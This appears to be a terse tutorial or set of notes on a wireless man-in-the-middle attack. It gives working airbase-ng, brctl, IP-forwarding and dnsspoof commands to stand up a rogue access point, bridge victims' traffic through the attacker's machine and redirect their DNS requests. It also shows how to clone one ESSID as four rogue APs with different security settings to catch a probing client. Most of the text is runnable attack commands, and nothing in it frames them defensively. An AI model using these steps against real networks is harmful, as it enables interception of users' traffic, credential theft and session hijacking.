... man in the middle attack, mitm attack.
...
... for mitm attack we will set up one fake but seems legitimaze
... ap for connections for clients and allow clients to use internet
... through the attackers device. say attacker has one wireless card and
... one lan card through which they are using internet. or two wireless
... cards one for internet connections and another for the fake ap.
... and we will bridge between two network wireless and wired adapter.

1. first we will set up one fake ap with the following command. this will
... create one at0 interface for us.

 # airbase-ng --essid masum-mitm -c 11 wlan0mon

2. now set the bridge interface and add the wire and wireless interface 
... we have added our eth0 and at0 to the bridge interface masum-bridge.

 # brctl addbr masum-bridge 
 # brctl addif masum-bridge eth0
 # brctl addif masum-bridge at0 
 # ifconfig eth0 0.0.0.0 up
 # ifconfig at0 0.0.0.0 up

3. now if any dhcp server running in lan or in attacke machine he can 
... ask for the dhcp ip or he can manually set ip for the masum-bridge
... interface.

 # dhclient masum-bridge
 # ifconfig masum-bridge 192.168.1.10 up

4. turn on the ip forwarding
 
 # echo 1 > /proc/sys/net/ipv4/ip_forward

... now if any client connect to this at0 fake ap we can see from the 
... airbase-ng command terminal. if we run wireshark on at0 interface
... then we can see that a lot of communication is going on.


.... dns spoofing and session hijacking.

... now from wireshark we are seeing that the victim is browing internet
... through attacker machine. what attacker can do at this stage is spoof
... dns and redirect all the dns request toward attacker machine.

 # dnsspoof -i masum-bridge 

... this command will spoof all dns request and point toward the attacker 
... machine.

.... configuring numerous ap with different security configuration.

... say by airodump-ng command we have found that one client is looking for
... an ap which he has connected before. but we dont know at that time what 
... was the security configuration like open or wep or wpa psk or wpa2 psk.

... one of the solution is to create four ap with different security config.

 # airmon-ng start wlan0

... run the above command for several times to create monitor interface like
... mon0, mon1, mon2, mon3. and then run the following command to create 
... ap with differenet security config.

 # airbase-ng --essid "Rokeya" -a AA:AA:AA:AA:AA:AA -c 3 mon0

... above is for the open ap 

 # airbase-ng --essid "Rokeya" -a BB:BB:BB:BB:BB:BB -W 1 -c 3 mon1

... above for the wep. 

... similary following is for wpa psk

 # airbase-ng --essid "Rokeya" -a CC:CC:CC:CC:CC:CC -W 1 -z 2 -c 3 mon2

... the following is for the wpa2-psk

 # airbase-ng --essid "Rokeya" -a DD:DD:DD:DD:DD:DD -W 1 -Z 2 -c 3 mon3
